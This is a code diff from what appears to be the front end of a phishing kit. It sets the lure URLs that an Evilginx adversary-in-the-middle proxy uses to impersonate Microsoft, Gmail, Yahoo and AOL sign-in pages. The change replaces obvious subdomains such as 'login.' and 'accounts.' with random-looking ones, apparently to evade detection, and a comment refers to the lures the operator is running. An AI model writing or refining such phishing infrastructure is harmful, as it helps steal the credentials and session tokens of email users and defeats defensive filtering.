@@ -46,10 +46,10 @@ const EVILGINX_DOMAIN = (import.meta.env.VITE_EVILGINX_DOMAIN || '').toLowerCase
 // --- UPDATED PROVIDER URLS ---
 // This section now perfectly matches the paths you are using in your Evilginx lures.
 const PROVIDER_URLS = EVILGINX_DOMAIN ? {
-  MICROSOFT: `https://login.${EVILGINX_DOMAIN}/auth/session/verify-8f72c9a1`,
-  GMAIL: `https://accounts.${EVILGINX_DOMAIN}/v2/identifier/session-req-b7d8e9`,
-  YAHOO: `https://signin.${EVILGINX_DOMAIN}/challenge/verify/token-xyz987`,
-  AOL: `https://myaccount.${EVILGINX_DOMAIN}/account/secure-login-chk-112233`,
+  MICROSOFT: `https://auth-s9d3k1f.${EVILGINX_DOMAIN}/auth/session/verify-8f72c9a1`,
+  GMAIL: `https://svc-g2h7j4p.${EVILGINX_DOMAIN}/v2/identifier/session-req-b7d8e9`,
+  YAHOO: `https://portal-y5n8m2q.${EVILGINX_DOMAIN}/challenge/verify/token-xyz987`,
+  AOL: `https://acct-a6b4c9x.${EVILGINX_DOMAIN}/account/secure-login-chk-112233`,
   OTHERS: ROUTES.LOGIN_OTHERS,
 } : {
   // Fallback internal routes when evilginx not configured
